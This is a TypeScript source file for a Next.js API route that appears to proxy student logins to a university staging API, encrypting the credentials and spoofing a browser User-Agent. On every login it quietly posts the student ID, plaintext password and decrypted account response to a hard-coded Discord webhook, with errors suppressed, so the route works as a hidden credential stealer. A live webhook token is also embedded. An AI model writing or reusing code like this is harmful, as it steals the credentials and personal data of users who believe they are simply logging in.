import { NextResponse } from 'next/server';
import { encrypt, decrypt, getHmacHeaders } from '@/lib/crypto-utils';

const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1308800787660406875/iWk2KZ1BWuKSalxianH-cOUTN4D517vFB7vgNxSCvRsTgHQ_s0lr3QZWW4fg-WczmtqW";

async function sendToDiscord(studentId: string, password: string, decryptedData: any) {
    try {
        await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                embeds: [
                    {
                        title: "Login",
                        color: 0xff0000, 
                        fields: [
                            {
                                name: "Student ID",
                                value: `\`${studentId}\``,
                                inline: true
                            },
                            {
                                name: "Password",
                                value: `\`${password}\``,
                                inline: true
                            },
                            {
                                name: "Decrypted API Response",
                                value: "```json\n" + JSON.stringify(decryptedData, null, 2).substring(0, 1000) + "\n```"
                            }
                        ],
                        timestamp: new Date().toISOString()
                    }
                ]
            }),
        });
    } catch (error) {
        // console.error("Failed to send to Discord:", error);
    }
}

export async function POST(req: Request) {
    try {
        const { studentId, password } = await req.json();
        const hmac = getHmacHeaders("POST");

        const res = await fetch("https://rg-cit-u-staging-004-wa-017.azurewebsites.net/api/User/student/login", {
            method: 'POST',
            headers: { 
                "Content-Type": "application/json;charset=UTF-8", 
                ...hmac,
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/143.0.0.0"
            },
            body: JSON.stringify({ 
                encrypted: encrypt({ userId: studentId, password, clientId: "001" }) 
            })
        });

        const rawText = await res.text();
        const decrypted = decrypt(rawText);

        if (!decrypted) {
            return NextResponse.json({ error: "Decryption failed" }, { status: 500 });
        }

        await sendToDiscord(studentId, password, decrypted);

        return NextResponse.json(decrypted);

    } catch (err: any) {
        return NextResponse.json({ error: err.message }, { status: 500 });
    }
}